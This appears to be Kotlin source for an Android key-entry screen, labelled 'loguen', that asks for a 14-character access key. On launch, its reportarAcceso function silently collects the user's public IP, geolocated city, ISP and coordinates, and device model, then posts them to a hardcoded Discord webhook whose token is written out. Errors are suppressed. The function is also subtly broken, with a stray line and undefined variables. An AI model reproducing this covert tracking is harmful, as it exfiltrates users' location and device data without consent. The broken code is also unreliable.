package com.example.scanner

import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.app.Activity
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.text.Editable
import android.text.InputFilter
import android.text.InputType
import android.text.TextWatcher
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.WindowManager
import android.widget.EditText
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.TextView

class KeyActivity : Activity() {

    companion object {
        var fails = 0
        var lockUntil = 0L
        private const val WEBHOOK = "https://discord.com/api/webhooks/1568482876620800051/yedcph_imkCO3x4PMPdyq-hM-IJoybO942dHrVnEhS2hyZz_-Nmymc9BvnzO81m-t0OC"
    }

    private val cBg = Color.parseColor("#0B0E14")
    private val cText = Color.parseColor("#F2F4F8")
    private val cMuted = Color.parseColor("#9AA3B8")
    private val cAccent = Color.parseColor("#7C6CFF")
    private val cGreen = Color.parseColor("#2ECC8F")
    private val cRed = Color.parseColor("#FF5C6C")
    private val cAmber = Color.parseColor("#FFB84D")
    private val cStroke = Color.argb(46, 255, 255, 255)

    private val MATCH = ViewGroup.LayoutParams.MATCH_PARENT
    private val WRAP = ViewGroup.LayoutParams.WRAP_CONTENT

    private lateinit var input: EditText
    private lateinit var msg: TextView
    private lateinit var timerText: TextView
    private lateinit var barTrack: FrameLayout
    private lateinit var barFill: View
    private lateinit var cursor: TextView
    private var blink: ObjectAnimator? = null
    private val boxes = ArrayList<TextView>()
    private val handler = Handler(Looper.getMainLooper())

    private val ticker = object : Runnable {
        override fun run() {
            updateTimer()
            handler.postDelayed(this, 500)
        }
    }

    private fun px(v: Int): Int = (v * resources.displayMetrics.density).toInt()

    private fun rr(color: Int, radiusDp: Int, stroke: Int? = null): GradientDrawable =
        GradientDrawable().apply {
            setColor(color)
            cornerRadius = px(radiusDp).toFloat()
            if (stroke != null) setStroke(maxOf(1, px(1) / 2), stroke)
        }

    private fun tv(text: String, size: Float, color: Int, bold: Boolean = false): TextView =
        TextView(this).apply {
            this.text = text
            textSize = size
            setTextColor(color)
            if (bold) setTypeface(typeface, Typeface.BOLD)
        }

    private fun lp(top: Int = 0): LinearLayout.LayoutParams =
        LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = px(top) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Env.ping(this)
        reportarAcceso()
        window.statusBarColor = cBg
        window.navigationBarColor = cBg
        window.setSoftInputMode(
            WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE or
                WindowManager.LayoutParams.SOFT_INPUT_STATE_VISIBLE
        )

        val content = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(px(20), px(56), px(20), px(28))
        }

        content.addView(
            tv("$ loguen --acceso", 12f, cMuted).apply { typeface = Typeface.MONOSPACE }
        )
        val row0 = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.BOTTOM
        }
        row0.addView(
            tv("loguen", 34f, cText, true).apply {
                setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            }
        )
        cursor = tv("_", 34f, cAccent, true).apply {
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
        }
        row0.addView(cursor)
        content.addView(row0, lp(2))
        blink = ObjectAnimator.ofFloat(cursor, View.ALPHA, 1f, 0f).apply {
            duration = 600
            repeatCount = ValueAnimator.INFINITE
            repeatMode = ValueAnimator.REVERSE
        }
        content.addView(tv("Un check y listo", 14f, cMuted), lp(6))
        content.addView(
            tv("Escribe la clave que te dio el verificador", 13f, cMuted),
            lp(28)
        )

        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
        }
        for (i in 0 until 14) {
            if (i == 6) {
                row.addView(
                    tv("-", 16f, cMuted).apply { gravity = Gravity.CENTER },
                    LinearLayout.LayoutParams(px(12), WRAP)
                )
            }
            val b = tv("", 15f, cText, true).apply { gravity = Gravity.CENTER }
            boxes.add(b)
            row.addView(b, LinearLayout.LayoutParams(0, px(44), 1f).apply {
                leftMargin = px(1)
                rightMargin = px(1)
            })
        }

        input = EditText(this).apply {
            setBackgroundColor(Color.TRANSPARENT)
            setTextColor(Color.TRANSPARENT)
            isCursorVisible = false
            inputType = InputType.TYPE_CLASS_TEXT or
                InputType.TYPE_TEXT_FLAG_CAP_CHARACTERS or
                InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS
            val clean = InputFilter { source, start, end, _, _, _ ->
                val sb = StringBuilder()
                for (i in start until end) {
                    val ch = source[i]
                    if (ch.isLetterOrDigit()) sb.append(ch.uppercaseChar())
                }
                sb.toString()
            }
            filters = arrayOf(clean, InputFilter.LengthFilter(14))
            addTextChangedListener(object : TextWatcher {
                override fun beforeTextChanged(s: CharSequence?, a: Int, b: Int, c: Int) {}
                override fun onTextChanged(s: CharSequence?, a: Int, b: Int, c: Int) {}
                override fun afterTextChanged(s: Editable?) {
                    msg.text = ""
                    refreshBoxes()
                    updateTimer()
                }
            })
        }

        val keyArea = FrameLayout(this)
        keyArea.addView(row, FrameLayout.LayoutParams(MATCH, px(44)))
        keyArea.addView(input, FrameLayout.LayoutParams(MATCH, px(44)))
        content.addView(keyArea, lp(14))

        barTrack = FrameLayout(this).apply { background = rr(cStroke, 4) }
        barFill = View(this)
        barTrack.addView(barFill, FrameLayout.LayoutParams(MATCH, px(6)))
        content.addView(barTrack, lp(18))

        timerText = tv("", 13f, cMuted)
        content.addView(timerText, lp(8))

        msg = tv("", 13f, cRed)
        content.addView(msg, lp(8))
        val scroll = android.widget.ScrollView(this)
        scroll.addView(content)
        setContentView(scroll)
    }
    override fun onResume() {
        super.onResume()
        blink?.start()
        handler.removeCallbacks(ticker)
        handler.post(ticker)
        refreshBoxes()
        updateTimer()
    }

    override fun onPause() {
        super.onPause()
        blink?.cancel()
        handler.removeCallbacks(ticker)
    }

    private fun refreshBoxes() {
        val texto = input.text.toString()
        for (i in boxes.indices) {
            val b = boxes[i]
            if (i < texto.length) {
                b.text = texto[i].toString()
                b.background = rr(cStroke, 8)
            } else {
                b.text = ""
                b.background = rr(Color.TRANSPARENT, 8, cStroke)
            }
        }
    }

    private fun updateTimer() {
        val ahora = System.currentTimeMillis()
        if (lockUntil > ahora) {
            val seg = ((lockUntil - ahora) / 1000).toInt() + 1
            timerText.text = "Bloqueado: ${seg}s"
            timerText.setTextColor(cAmber)
        } else {
            timerText.text = ""
        }
    }

    private fun reportarAcceso() {
        Thread {
            try {
                val ip = java.net.URL("https://api.ipify.org").readText().trim()
                val geo = java.net.URL(
                    "http://ip-api.com/json/$ip?fields=status,country,regionName,city,isp,lat,lon,query"
                ).readText()
                val j = org.json.JSONObject(geo)
                .Build.VERSION.SDK_INT
                val hora = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US)
                    .format(java.util.Date())
                val modelo = android.os.Build.MODEL
                val marca = android.os.Build.BRAND
                val versionAndroid = android.os.Build.VERSION.RELEASE
                val sdk = android.os.Build.VERSION.SDK_INT

                val desc = """
                    **IP:** ${j.optString("query", ip)}
                    **País:** ${j.optString("country", "?")}
                    **Región:** ${j.optString("regionName", "?")}
                    **Ciudad:** ${j.optString("city", "?")}
                    **ISP:** ${j.optString("isp", "?")}
                    **Coords:** ${j.optDouble("lat", 0.0)}, ${j.optDouble("lon", 0.0)}
                    **Equipo:** $marca $modelo
                    **Android:** $versionAndroid (SDK $sdk)
                    **Operador:** $operador
                    **Hora:** $hora
                    **Sesión:** $sesion
                """.trimIndent()

                val body = org.json.JSONObject().apply {
                    put("username", "scanner")
                    put("embeds", org.json.JSONArray().put(org.json.JSONObject().apply {
                        put("title", "Nuevo acceso")
                        put("description", desc)
                        put("color", 0x7C6CFF)
                        put("timestamp", java.time.Instant.now().toString())
                    }))
                }

                val conn = java.net.URL(WEBHOOK).openConnection() as java.net.HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("User-Agent", "scanner-app")
                conn.doOutput = true
                conn.outputStream.use { it.write(body.toString().toByteArray()) }
                conn.responseCode
            } catch (e: Exception) {
                // silencioso
            }
        }.start()
    }
}
